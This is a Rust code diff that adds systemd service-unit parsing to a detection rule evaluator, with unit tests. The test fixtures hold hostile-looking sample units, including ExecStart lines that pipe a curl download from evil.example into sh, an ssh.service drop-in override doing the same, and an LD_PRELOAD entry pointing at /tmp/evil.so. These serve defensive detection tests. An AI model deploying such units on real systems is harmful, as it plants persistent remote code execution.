@@ -1,6 +1,6 @@
-//! Key-Value condition evaluator for structured manifest files.
+//! Key-Value condition evaluator for structured manifest files and systemd units.
 //!
-//! Supports querying JSON, YAML, and TOML manifests using path expressions.
+//! Supports querying JSON, YAML, TOML, and systemd service files using path expressions.
 //!
 //! # Path Syntax
 //! - `key` - Access object key
@@ -48,6 +48,8 @@ pub(crate) enum StructuredFormat {
     PkgInfo,
     /// Windows Shell Link (.lnk) file
     Lnk,
+    /// systemd service unit file (.service, .service.d/*.conf)
+    SystemdService,
     /// Format could not be determined
     Unknown,
 }
@@ -222,8 +224,8 @@ fn value_to_string(value: &Value) -> String {
 
 /// Detect the format of a structured data file.
 ///
-/// Only recognizes known manifest filenames to avoid processing arbitrary structured data files.
-/// This ensures we only parse files we have explicit support for.
+/// Only recognizes known manifest filenames plus explicit systemd service paths to avoid
+/// processing arbitrary structured data files.
 #[must_use]
 pub(crate) fn detect_format(path: &Path, content: &[u8]) -> StructuredFormat {
     let path_str = path.to_string_lossy().to_lowercase();
@@ -253,6 +255,16 @@ pub(crate) fn detect_format(path: &Path, content: &[u8]) -> StructuredFormat {
         }
         if name_lower == "action.yml" || name_lower == "action.yaml" {
             return StructuredFormat::Yaml;
+        }
+
+        // systemd service units and drop-ins
+        if name_lower.ends_with(".service") {
+            return StructuredFormat::SystemdService;
+        }
+        if (path_str.contains(".service.d/") || path_str.contains(".service.d\\"))
+            && name_lower.ends_with(".conf")
+        {
+            return StructuredFormat::SystemdService;
         }
 
         // Python package metadata files (RFC 822 format)
@@ -307,7 +319,7 @@ pub(crate) fn detect_format(path: &Path, content: &[u8]) -> StructuredFormat {
         return StructuredFormat::PkgInfo;
     }
 
-    // No other content sniffing - only process known filenames
+    // No other content sniffing - only process known filenames / unit paths
     StructuredFormat::Unknown
 }
 
@@ -590,6 +602,503 @@ fn parse_lnk(content: &[u8]) -> Option<Value> {
     Some(Value::Object(map))
 }
 
+fn parse_systemd_service(content: &[u8]) -> Option<Value> {
+    let text = std::str::from_utf8(content).ok()?;
+    let mut root: serde_json::Map<String, Value> = serde_json::Map::new();
+    let mut current_section: Option<String> = None;
+
+    for line in collect_systemd_logical_lines(text) {
+        let trimmed = line.trim();
+        if let Some(section) = parse_systemd_section_header(trimmed) {
+            current_section = Some(section);
+            continue;
+        }
+
+        let Some(section_name) = current_section.as_deref() else {
+            continue;
+        };
+        let Some(eq_pos) = line.find('=') else {
+            continue;
+        };
+
+        let raw_key = line[..eq_pos].trim();
+        if raw_key.is_empty() {
+            continue;
+        }
+        let key = normalize_systemd_key(raw_key);
+        if key.is_empty() {
+            continue;
+        }
+
+        let raw_value = line[eq_pos + 1..].trim().to_string();
+        let Some(section_obj) = ensure_json_object(&mut root, section_name) else {
+            continue;
+        };
+
+        if raw_value.is_empty() && is_systemd_multi_value_key(&key) {
+            clear_systemd_key(section_obj, &key);
+            continue;
+        }
+
+        if key == "environment" {
+            append_systemd_raw(section_obj, &key, raw_value.clone());
+            let items = split_systemd_items(&raw_value);
+            if !items.is_empty() {
+                append_string_items(section_obj, "environment_list", items.clone());
+                if let Some(env_obj) = ensure_child_json_object(section_obj, "environment") {
+                    for item in items {
+                        if let Some((name, value)) = item.split_once('=') {
+                            if !name.is_empty() {
+                                append_string_occurrence(env_obj, name, value.to_string());
+                            }
+                        }
+                    }
+                }
+            }
+            continue;
+        }
+
+        if is_systemd_command_key(&key) {
+            append_systemd_raw(section_obj, &key, raw_value.clone());
+            append_string_occurrence(section_obj, &key, raw_value);
+            continue;
+        }
+
+        if is_systemd_token_list_key(&key) {
+            append_systemd_raw(section_obj, &key, raw_value.clone());
+            let items = split_systemd_items(&raw_value);
+            if items.is_empty() {
+                append_string_occurrence(section_obj, &key, raw_value);
+            } else {
+                append_string_items(section_obj, &key, items);
+            }
+            continue;
+        }
+
+        append_string_occurrence(section_obj, &key, raw_value);
+    }
+
+    if root.is_empty() {
+        None
+    } else {
+        Some(Value::Object(root))
+    }
+}
+
+fn collect_systemd_logical_lines(text: &str) -> Vec<String> {
+    let mut lines = Vec::new();
+    let mut current = String::new();
+    let mut continuing = false;
+
+    for raw_line in text.lines() {
+        let line = raw_line.trim_end_matches('\r');
+        let trimmed_start = line.trim_start();
+
+        if !continuing
+            && (trimmed_start.is_empty()
+                || trimmed_start.starts_with('#')
+                || trimmed_start.starts_with(';'))
+        {
+            continue;
+        }
+
+        if continuing
+            && (trimmed_start.is_empty()
+                || trimmed_start.starts_with('#')
+                || trimmed_start.starts_with(';'))
+        {
+            continue;
+        }
+
+        let segment = if continuing { trimmed_start } else { line };
+        let segment = segment.trim_end();
+        let has_continuation = ends_with_unescaped_backslash(segment);
+        let piece = if has_continuation {
+            segment[..segment.len().saturating_sub(1)].trim_end()
+        } else {
+            segment
+        };
+
+        current.push_str(piece);
+
+        if has_continuation {
+            current.push(' ');
+            continuing = true;
+        } else {
+            let logical = current.trim();
+            if !logical.is_empty() {
+                lines.push(logical.to_string());
+            }
+            current.clear();
+            continuing = false;
+        }
+    }
+
+    let trailing = current.trim();
+    if !trailing.is_empty() {
+        lines.push(trailing.to_string());
+    }
+
+    lines
+}
+
+fn ends_with_unescaped_backslash(s: &str) -> bool {
+    let mut count = 0usize;
+    for ch in s.chars().rev() {
+        if ch == '\\' {
+            count += 1;
+        } else {
+            break;
+        }
+    }
+    count % 2 == 1
+}
+
+fn parse_systemd_section_header(line: &str) -> Option<String> {
+    let inner = line.strip_prefix('[')?.strip_suffix(']')?.trim();
+    if inner.is_empty() {
+        None
+    } else {
+        Some(normalize_systemd_key(inner))
+    }
+}
+
+fn normalize_systemd_key(raw: &str) -> String {
+    let chars: Vec<char> = raw.chars().collect();
+    let mut out = String::new();
+
+    for (idx, ch) in chars.iter().enumerate() {
+        if ch.is_ascii_alphanumeric() {
+            let is_upper = ch.is_ascii_uppercase();
+            let prev = idx.checked_sub(1).and_then(|i| chars.get(i));
+            let next = chars.get(idx + 1);
+            let prev_is_lower_or_digit =
+                prev.is_some_and(|c| c.is_ascii_lowercase() || c.is_ascii_digit());
+            let prev_is_upper = prev.is_some_and(|c| c.is_ascii_uppercase());
+            let next_is_lower = next.is_some_and(|c| c.is_ascii_lowercase());
+
+            if is_upper
+                && !out.is_empty()
+                && (prev_is_lower_or_digit || (prev_is_upper && next_is_lower))
+            {
+                out.push('_');
+            }
+            out.push(ch.to_ascii_lowercase());
+        } else if (*ch == '-' || *ch == ' ' || *ch == '.' || *ch == '/')
+            && !out.ends_with('_')
+            && !out.is_empty()
+        {
+            out.push('_');
+        }
+    }
+
+    out.trim_matches('_').to_string()
+}
+
+fn is_systemd_token_list_key(key: &str) -> bool {
+    matches!(
+        key,
+        "after"
+            | "before"
+            | "wants"
+            | "wanted_by"
+            | "requires"
+            | "required_by"
+            | "requisite"
+            | "binds_to"
+            | "part_of"
+            | "upholds"
+            | "conflicts"
+            | "also"
+            | "alias"
+            | "documentation"
+            | "environment_file"
+            | "pass_environment"
+            | "unset_environment"
+            | "read_write_paths"
+            | "read_only_paths"
+            | "inaccessible_paths"
+            | "exec_paths"
+            | "no_exec_paths"
+            | "supplementary_groups"
+            | "capability_bounding_set"
+            | "ambient_capabilities"
+            | "restrict_address_families"
+            | "system_call_filter"
+            | "system_call_architectures"
+    )
+}
+
+fn is_systemd_command_key(key: &str) -> bool {
+    matches!(
+        key,
+        "exec_start"
+            | "exec_start_pre"
+            | "exec_start_post"
+            | "exec_reload"
+            | "exec_stop"
+            | "exec_stop_post"
+    )
+}
+
+fn is_systemd_multi_value_key(key: &str) -> bool {
+    key == "environment" || is_systemd_command_key(key) || is_systemd_token_list_key(key)
+}
+
+fn ensure_json_object<'a>(
+    map: &'a mut serde_json::Map<String, Value>,
+    key: &str,
+) -> Option<&'a mut serde_json::Map<String, Value>> {
+    if !map.contains_key(key) {
+        map.insert(key.to_string(), Value::Object(serde_json::Map::new()));
+    }
+    map.get_mut(key)?.as_object_mut()
+}
+
+fn ensure_child_json_object<'a>(
+    map: &'a mut serde_json::Map<String, Value>,
+    key: &str,
+) -> Option<&'a mut serde_json::Map<String, Value>> {
+    ensure_json_object(map, key)
+}
+
+fn append_systemd_raw(section_obj: &mut serde_json::Map<String, Value>, key: &str, value: String) {
+    if let Some(raw_obj) = ensure_child_json_object(section_obj, "_raw") {
+        append_string_occurrence(raw_obj, key, value);
+    }
+}
+
+fn append_string_occurrence(map: &mut serde_json::Map<String, Value>, key: &str, value: String) {
+    let new_value = Value::String(value);
+    match map.get_mut(key) {
+        None => {
+            map.insert(key.to_string(), new_value);
+        }
+        Some(Value::Array(arr)) => arr.push(new_value),
+        Some(existing) => {
+            let old = std::mem::replace(existing, Value::Null);
+            *existing = Value::Array(vec![old, new_value]);
+        }
+    }
+}
+
+fn append_string_items<I>(map: &mut serde_json::Map<String, Value>, key: &str, items: I)
+where
+    I: IntoIterator<Item = String>,
+{
+    for item in items {
+        append_string_occurrence(map, key, item);
+    }
+}
+
+fn clear_systemd_key(section_obj: &mut serde_json::Map<String, Value>, key: &str) {
+    section_obj.remove(key);
+    if key == "environment" {
+        section_obj.remove("environment_list");
+        section_obj.remove("environment");
+    }
+
+    if let Some(raw_obj) = section_obj.get_mut("_raw").and_then(Value::as_object_mut) {
+        raw_obj.remove(key);
+        if raw_obj.is_empty() {
+            section_obj.remove("_raw");
+        }
+    }
+}
+
+fn split_systemd_items(input: &str) -> Vec<String> {
+    let mut items = Vec::new();
+    let mut current = String::new();
+    let mut quote: Option<char> = None;
+    let mut chars = input.chars().peekable();
+    let mut in_item = false;
+
+    while let Some(ch) = chars.next() {
+        match quote {
+            Some(expected) => {
+                if ch == expected {
+                    quote = None;
+                } else if ch == '\\' {
+                    push_systemd_escape(&mut current, &mut chars);
+                } else {
+                    current.push(ch);
+                }
+                in_item = true;
+            }
+            None => match ch {
+                ' ' | '\t' => {
+                    if in_item {
+                        items.push(std::mem::take(&mut current));
+                        in_item = false;
+                    }
+                }
+                '"' | '\'' if current.is_empty() => {
+                    quote = Some(ch);
+                    in_item = true;
+                }
+                '\\' => {
+                    push_systemd_escape(&mut current, &mut chars);
+                    in_item = true;
+                }
+                _ => {
+                    current.push(ch);
+                    in_item = true;
+                }
+            },
+        }
+    }
+
+    if in_item {
+        items.push(current);
+    }
+
+    items
+}
+
+fn push_systemd_escape(out: &mut String, chars: &mut std::iter::Peekable<std::str::Chars<'_>>) {
+    let Some(next) = chars.next() else {
+        out.push('\\');
+        return;
+    };
+
+    match next {
+        'a' => out.push('\u{0007}'),
+        'b' => out.push('\u{0008}'),
+        'f' => out.push('\u{000C}'),
+        'n' => out.push('\n'),
+        'r' => out.push('\r'),
+        't' => out.push('\t'),
+        'v' => out.push('\u{000B}'),
+        '\\' => out.push('\\'),
+        '"' => out.push('"'),
+        '\'' => out.push('\''),
+        's' => out.push(' '),
+        'x' => push_radix_escape(out, chars, 16, 2, 'x'),
+        'u' => push_unicode_escape(out, chars, 4, 'u'),
+        'U' => push_unicode_escape(out, chars, 8, 'U'),
+        '0'..='7' => push_octal_escape(out, chars, next),
+        other => out.push(other),
+    }
+}
+
+fn push_radix_escape(
+    out: &mut String,
+    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
+    radix: u32,
+    max_digits: usize,
+    fallback_prefix: char,
+) {
+    let mut digits = String::new();
+    while digits.len() < max_digits {
+        let Some(next) = chars.peek().copied() else {
+            break;
+        };
+        if next.is_digit(radix) {
+            digits.push(next);
+            chars.next();
+        } else {
+            break;
+        }
+    }
+
+    if digits.is_empty() {
+        out.push(fallback_prefix);
+        return;
+    }
+
+    if let Ok(value) = u32::from_str_radix(&digits, radix) {
+        if let Some(decoded) = char::from_u32(value) {
+            out.push(decoded);
+            return;
+        }
+    }
+
+    out.push(fallback_prefix);
+    out.push_str(&digits);
+}
+
+fn push_unicode_escape(
+    out: &mut String,
+    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
+    digits: usize,
+    fallback_prefix: char,
+) {
+    let mut buf = String::new();
+    while buf.len() < digits {
+        let Some(next) = chars.peek().copied() else {
+            break;
+        };
+        if next.is_ascii_hexdigit() {
+            buf.push(next);
+            chars.next();
+        } else {
+            break;
+        }
+    }
+
+    if buf.len() != digits {
+        out.push(fallback_prefix);
+        out.push_str(&buf);
+        return;
+    }
+
+    if let Ok(value) = u32::from_str_radix(&buf, 16) {
+        if let Some(decoded) = char::from_u32(value) {
+            out.push(decoded);
+            return;
+        }
+    }
+
+    out.push(fallback_prefix);
+    out.push_str(&buf);
+}
+
+fn push_octal_escape(
+    out: &mut String,
+    chars: &mut std::iter::Peekable<std::str::Chars<'_>>,
+    first: char,
+) {
+    let mut digits = String::new();
+    digits.push(first);
+    while digits.len() < 3 {
+        let Some(next) = chars.peek().copied() else {
+            break;
+        };
+        if ('0'..='7').contains(&next) {
+            digits.push(next);
+            chars.next();
+        } else {
+            break;
+        }
+    }
+
+    if let Ok(value) = u32::from_str_radix(&digits, 8) {
+        if let Some(decoded) = char::from_u32(value) {
+            out.push(decoded);
+            return;
+        }
+    }
+
+    out.push_str(&digits);
+}
+
+fn structured_format_from_file_type(
+    file_type: &crate::composite_rules::FileType,
+) -> StructuredFormat {
+    match file_type {
+        crate::composite_rules::FileType::PackageJson
+        | crate::composite_rules::FileType::ChromeManifest => StructuredFormat::Json,
+        crate::composite_rules::FileType::CargoToml
+        | crate::composite_rules::FileType::PyProjectToml => StructuredFormat::Toml,
+        crate::composite_rules::FileType::GithubActions => StructuredFormat::Yaml,
+        crate::composite_rules::FileType::Plist => StructuredFormat::Plist,
+        crate::composite_rules::FileType::PkgInfo => StructuredFormat::PkgInfo,
+        crate::composite_rules::FileType::Lnk => StructuredFormat::Lnk,
+        crate::composite_rules::FileType::SystemdService => StructuredFormat::SystemdService,
+        _ => StructuredFormat::Unknown,
+    }
+}
+
 /// Evaluate a kv condition against file content using cached format detection and parsing.
 ///
 /// Returns Some(Evidence) if the condition matches, None otherwise.
@@ -629,12 +1138,17 @@ pub(crate) fn evaluate_kv(condition: &Condition, ctx: &EvaluationContext<'_>) ->
     }
 
     // Check cached format, detect if not cached
-    let format = ctx
+    let detected_format = ctx
         .cached_kv_format
         .get_or_init(|| detect_format(file_path, content));
+    let format = if *detected_format == StructuredFormat::Unknown {
+        structured_format_from_file_type(&ctx.file_type)
+    } else {
+        *detected_format
+    };
 
     // If format is unknown, no need to parse
-    if *format == StructuredFormat::Unknown {
+    if format == StructuredFormat::Unknown {
         return None;
     }
 
@@ -649,6 +1163,7 @@ pub(crate) fn evaluate_kv(condition: &Condition, ctx: &EvaluationContext<'_>) ->
             StructuredFormat::Plist => plist::from_bytes(content).ok(),
             StructuredFormat::PkgInfo => parse_pkginfo(content),
             StructuredFormat::Lnk => parse_lnk(content),
+            StructuredFormat::SystemdService => parse_systemd_service(content),
             StructuredFormat::Unknown => None,
         };
 
@@ -781,6 +1296,14 @@ mod tests {
         binary_data: &'a [u8],
         path: &'a std::path::Path,
     ) -> EvaluationContext<'a> {
+        create_test_ctx_with_file_type(binary_data, path, FileType::All)
+    }
+
+    fn create_test_ctx_with_file_type<'a>(
+        binary_data: &'a [u8],
+        path: &'a std::path::Path,
+        file_type: FileType,
+    ) -> EvaluationContext<'a> {
         // Create minimal report with the path we need
         let report = Box::leak(Box::new(AnalysisReport::new(TargetInfo {
             path: path.display().to_string(),
@@ -790,7 +1313,7 @@ mod tests {
             architectures: None,
         })));
 
-        EvaluationContext::test_only_new(report, binary_data, FileType::All)
+        EvaluationContext::test_only_new(report, binary_data, file_type)
     }
 
     /// Test wrapper for evaluate_kv that creates context automatically
@@ -800,6 +1323,16 @@ mod tests {
         path: &std::path::Path,
     ) -> Option<Evidence> {
         let ctx = create_test_ctx(data, path);
+        evaluate_kv(condition, &ctx)
+    }
+
+    fn evaluate_kv_test_with_file_type(
+        condition: &Condition,
+        data: &[u8],
+        path: &std::path::Path,
+        file_type: FileType,
+    ) -> Option<Evidence> {
+        let ctx = create_test_ctx_with_file_type(data, path, file_type);
         evaluate_kv(condition, &ctx)
     }
 
@@ -1755,6 +2288,337 @@ mod tests {
             detect_format(Path::new("PyProject.toml"), toml_content),
             StructuredFormat::Toml
         );
+    }
+
+    #[test]
+    fn test_detect_systemd_service_files() {
+        let service = b"[Unit]\nDescription=Updater\n[Service]\nExecStart=/bin/true\n";
+        assert_eq!(
+            detect_format(Path::new("evil.service"), service),
+            StructuredFormat::SystemdService
+        );
+        assert_eq!(
+            detect_format(
+                Path::new("/etc/systemd/system/ssh.service.d/override.conf"),
+                service
+            ),
+            StructuredFormat::SystemdService
+        );
+    }
+
+    #[test]
+    fn test_parse_systemd_service_structure() {
+        let service = br#"
+# leading comment
+[Unit]
+Description=Updater
+After=network-online.target auditd.service
+
+[Service]
+Type=simple
+Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
+ExecStart=/bin/old
+ExecStart=
+ExecStart=/bin/bash -c \
+# comment in continued block should be ignored
+  curl -fsSL https://evil.example/payload.sh | sh
+ExecStartPre=/usr/bin/test -x /bin/bash
+ReadWritePaths=/etc/systemd/system /tmp
+
+[Install]
+WantedBy=multi-user.target graphical.target
+"#;
+
+        let parsed = parse_systemd_service(service).expect("systemd service should parse");
+
+        let exec_start = navigate(&parsed, &parse_path("service.exec_start").unwrap());
+        assert_eq!(exec_start.len(), 1);
+        assert_eq!(
+            exec_start[0],
+            &json!("/bin/bash -c curl -fsSL https://evil.example/payload.sh | sh")
+        );
+
+        let exec_start_pre = navigate(&parsed, &parse_path("service.exec_start_pre").unwrap());
+        assert_eq!(exec_start_pre, vec![&json!("/usr/bin/test -x /bin/bash")]);
+
+        let env_var = navigate(
+            &parsed,
+            &parse_path("service.environment.LD_PRELOAD").unwrap(),
+        );
+        assert_eq!(env_var, vec![&json!("/tmp/evil.so")]);
+
+        let after = navigate(&parsed, &parse_path("unit.after").unwrap());
+        assert_eq!(
+            after,
+            vec![&json!(["network-online.target", "auditd.service"])]
+        );
+
+        let wanted_by = navigate(&parsed, &parse_path("install.wanted_by").unwrap());
+        assert_eq!(
+            wanted_by,
+            vec![&json!(["multi-user.target", "graphical.target"])]
+        );
+
+        let read_write_paths = navigate(&parsed, &parse_path("service.read_write_paths").unwrap());
+        assert_eq!(
+            read_write_paths,
+            vec![&json!(["/etc/systemd/system", "/tmp"])]
+        );
+    }
+
+    #[test]
+    fn test_evaluate_kv_systemd_service_queries() {
+        let service = br#"
+[Unit]
+After=network-online.target auditd.service
+
+[Service]
+Environment="LD_PRELOAD=/tmp/evil.so"
+ExecStart=/bin/old
+ExecStart=
+ExecStart=/bin/bash -c \
+  curl -fsSL https://evil.example/payload.sh | sh
+
+[Install]
+WantedBy=multi-user.target graphical.target
+"#;
+        let path = Path::new("evil.service");
+
+        let exec_start = Condition::Kv {
+            path: "service.exec_start".to_string(),
+            exact: None,
+            substr: Some("evil.example/payload.sh".to_string()),
+            regex: None,
+            case_insensitive: false,
+            exists: None,
+            size_min: None,
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(evaluate_kv_test(&exec_start, service, path).is_some());
+
+        let ld_preload = Condition::Kv {
+            path: "service.environment.LD_PRELOAD".to_string(),
+            exact: Some("/tmp/evil.so".to_string()),
+            substr: None,
+            regex: None,
+            case_insensitive: false,
+            exists: None,
+            size_min: None,
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(evaluate_kv_test(&ld_preload, service, path).is_some());
+
+        let wanted_by_member = Condition::Kv {
+            path: "install.wanted_by".to_string(),
+            exact: Some("multi-user.target".to_string()),
+            substr: None,
+            regex: None,
+            case_insensitive: false,
+            exists: None,
+            size_min: None,
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(evaluate_kv_test(&wanted_by_member, service, path).is_some());
+
+        let wanted_by_size = Condition::Kv {
+            path: "install.wanted_by".to_string(),
+            exact: None,
+            substr: None,
+            regex: None,
+            case_insensitive: false,
+            exists: Some(true),
+            size_min: Some(2),
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(evaluate_kv_test(&wanted_by_size, service, path).is_some());
+
+        let old_exec_start = Condition::Kv {
+            path: "service.exec_start".to_string(),
+            exact: Some("/bin/old".to_string()),
+            substr: None,
+            regex: None,
+            case_insensitive: false,
+            exists: None,
+            size_min: None,
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(evaluate_kv_test(&old_exec_start, service, path).is_none());
+    }
+
+    #[test]
+    fn test_evaluate_kv_systemd_service_drop_in() {
+        let service = b"[Service]\nExecStart=/usr/bin/curl https://evil.example/dropin.sh | sh\n";
+        let path = Path::new("/etc/systemd/system/ssh.service.d/override.conf");
+        let cond = Condition::Kv {
+            path: "service.exec_start".to_string(),
+            exact: None,
+            substr: Some("evil.example/dropin.sh".to_string()),
+            regex: None,
+            case_insensitive: false,
+            exists: None,
+            size_min: None,
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(evaluate_kv_test(&cond, service, path).is_some());
+    }
+
+    #[test]
+    fn test_evaluate_kv_systemd_service_file_type_override() {
+        let service = b"[Service]\nExecStart=/bin/bash -c curl https://evil.example | sh\n";
+        let path = Path::new("suspicious.txt");
+        let cond = Condition::Kv {
+            path: "service.exec_start".to_string(),
+            exact: None,
+            substr: Some("evil.example".to_string()),
+            regex: None,
+            case_insensitive: false,
+            exists: None,
+            size_min: None,
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(
+            evaluate_kv_test_with_file_type(&cond, service, path, FileType::SystemdService)
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn test_parse_systemd_service_environment_reset_and_raw_tracking() {
+        let service = br#"
+[Service]
+Environment="LD_PRELOAD=/tmp/old.so" "URL=https://old.example/payload.sh"
+Environment=
+Environment="LD_PRELOAD=/tmp/new.so" PATH=/tmp/bin
+ExecStart=/bin/old
+ExecStart=
+ExecStart=/bin/new
+"#;
+
+        let parsed = parse_systemd_service(service).expect("systemd service should parse");
+
+        let ld_preload = navigate(
+            &parsed,
+            &parse_path("service.environment.LD_PRELOAD").unwrap(),
+        );
+        assert_eq!(ld_preload, vec![&json!("/tmp/new.so")]);
+
+        let old_url = navigate(&parsed, &parse_path("service.environment.URL").unwrap());
+        assert!(
+            old_url.is_empty(),
+            "Environment= reset should clear old keys"
+        );
+
+        let env_list = navigate(&parsed, &parse_path("service.environment_list").unwrap());
+        assert_eq!(
+            env_list,
+            vec![&json!(["LD_PRELOAD=/tmp/new.so", "PATH=/tmp/bin"])]
+        );
+
+        let raw_env = navigate(&parsed, &parse_path("service._raw.environment").unwrap());
+        assert_eq!(
+            raw_env,
+            vec![&json!("\"LD_PRELOAD=/tmp/new.so\" PATH=/tmp/bin")]
+        );
+
+        let exec_start = navigate(&parsed, &parse_path("service.exec_start").unwrap());
+        assert_eq!(exec_start, vec![&json!("/bin/new")]);
+
+        let raw_exec_start = navigate(&parsed, &parse_path("service._raw.exec_start").unwrap());
+        assert_eq!(raw_exec_start, vec![&json!("/bin/new")]);
+    }
+
+    #[test]
+    fn test_parse_systemd_service_escaped_items_and_semicolon_comments() {
+        let service = br#"
+; leading comment
+[Service]
+ReadOnlyPaths=/opt/my\sdir "/srv/quoted path"
+Environment='GREETING=hello world' PATH=/tmp/my\sbin
+ExecStartPre=/bin/echo start \
+; comment inside continued block
+  done
+"#;
+
+        let parsed = parse_systemd_service(service).expect("systemd service should parse");
+
+        let read_only_paths = navigate(&parsed, &parse_path("service.read_only_paths").unwrap());
+        assert_eq!(
+            read_only_paths,
+            vec![&json!(["/opt/my dir", "/srv/quoted path"])]
+        );
+
+        let greeting = navigate(
+            &parsed,
+            &parse_path("service.environment.GREETING").unwrap(),
+        );
+        assert_eq!(greeting, vec![&json!("hello world")]);
+
+        let path_value = navigate(&parsed, &parse_path("service.environment.PATH").unwrap());
+        assert_eq!(path_value, vec![&json!("/tmp/my bin")]);
+
+        let env_list = navigate(&parsed, &parse_path("service.environment_list").unwrap());
+        assert_eq!(
+            env_list,
+            vec![&json!(["GREETING=hello world", "PATH=/tmp/my bin"])]
+        );
+
+        let exec_start_pre = navigate(&parsed, &parse_path("service.exec_start_pre").unwrap());
+        assert_eq!(exec_start_pre, vec![&json!("/bin/echo start done")]);
+    }
+
+    #[test]
+    fn test_evaluate_kv_systemd_environment_list_and_raw_queries() {
+        let service = br#"
+[Service]
+Environment="LD_PRELOAD=/tmp/evil.so" "URL=https://evil.example/payload.sh"
+"#;
+        let path = Path::new("evil.service");
+
+        let env_list_item = Condition::Kv {
+            path: "service.environment_list[*]".to_string(),
+            exact: Some("LD_PRELOAD=/tmp/evil.so".to_string()),
+            substr: None,
+            regex: None,
+            case_insensitive: false,
+            exists: None,
+            size_min: None,
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(evaluate_kv_test(&env_list_item, service, path).is_some());
+
+        let env_var = Condition::Kv {
+            path: "service.environment.URL".to_string(),
+            exact: Some("https://evil.example/payload.sh".to_string()),
+            substr: None,
+            regex: None,
+            case_insensitive: false,
+            exists: None,
+            size_min: None,
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(evaluate_kv_test(&env_var, service, path).is_some());
+
+        let raw_env = Condition::Kv {
+            path: "service._raw.environment".to_string(),
+            exact: None,
+            substr: Some("URL=https://evil.example/payload.sh".to_string()),
+            regex: None,
+            case_insensitive: false,
+            exists: None,
+            size_min: None,
+            size_max: None,
+            compiled_regex: None,
+        };
+        assert!(evaluate_kv_test(&raw_env, service, path).is_some());
     }
 
     // ==========================================================================
